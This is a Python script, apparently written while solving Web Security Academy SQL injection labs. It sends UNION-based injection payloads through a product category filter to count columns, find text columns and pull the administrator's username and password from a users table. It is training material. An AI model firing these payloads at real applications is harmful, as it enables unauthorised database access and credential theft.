import requests
import urllib.parse


# # Using nulls to determine number of columns
# with requests.Session() as s:
#     commandString = "Accessories' UNION SELECT NULL,NULL,NULL--"
#     url = f'https://0acf00000307cb25c02f605e00ec00a5.web-security-academy.net/filter?category={urllib.parse.quote(commandString)}'
#     session = s.get(url)
#     print(session.text)
# # Three columns!!


# Findind the column with a string datatype to find the one to export data from
# with requests.Session() as s:
#     commandString = "Accessories' UNION SELECT NULL,database(),NULL--"
#     url = f'https://0a6a004a042d854dc099a34d00c10019.web-security-academy.net/filter?category={urllib.parse.quote(commandString)}'
#     session = s.get(url)
#     print(session.text)
# Three columns!!

# This next method determines which values we can use for string data
# with requests.Session() as s:
#     # The string below is just random value given in a network response to test if you found which one returned string data
#     commandString = "Accessories' UNION SELECT NULL,'zVbp2h',NULL--"
#     url = f'https://0a600036031b7e8bc060540b00180038.web-security-academy.net/filter?category={urllib.parse.quote(commandString)}'
#     session = s.get(url)
#     print(session.text)

# This one made me determine number of columns and the string to get the information I want
# with requests.Session() as s:
#     # The string below is just random value given in a network response to test if you found which one returned string data
#     commandString = "Accessories' UNION SELECT NULL,password FROM users WHERE username = 'administrator'--"
#     url = f'https://0a96005803c0a52fc0bba1e2009300aa.web-security-academy.net/filter?category={urllib.parse.quote(commandString)}'
#     session = s.get(url)
#     print(session.text)


# This one made me determine number of columns and the string to get the information I want
with requests.Session() as s:
    # The string below is just random value given in a network response to test if you found which one returned string data
    commandString = "Accessories' UNION SELECT NULL,username || '~' || password FROM users WHERE username = 'administrator'--"
    url = f'https://0a0100ec031d0a83c01397f300d7003f.web-security-academy.net/filter?category={urllib.parse.quote(commandString)}'
    session = s.get(url)
    print(session.text)







